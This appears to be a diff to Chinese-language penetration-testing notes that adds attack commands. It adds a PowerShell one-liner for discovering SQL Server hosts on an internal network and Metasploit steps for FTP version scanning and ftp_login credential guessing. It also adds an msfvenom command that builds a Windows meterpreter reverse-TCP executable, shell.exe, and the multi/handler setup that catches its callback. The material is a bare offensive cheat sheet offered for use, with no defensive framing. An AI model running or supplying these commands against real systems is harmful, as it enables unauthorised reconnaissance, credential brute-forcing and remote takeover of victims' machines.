@@ -59,9 +59,29 @@ auxiliary/scanner/db2/db2_version
 auxiliary/scanner/portscan/ack
 auxiliary/scanner/portscan/tcp
 
+[ 015 ] PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"
+# 基于SqlDataSourceEnumerator发现内网存活主机
 ```
 2.js快速启动服务器
 ```
 npm install -g anywhere
 anywhere.cmd
+```
+
+3.尝试ftp攻击
+```
+search type:auxiliary ftp
+先扫描:use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/ftp/ftp_login
+```
+4.payload生成
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
 ```
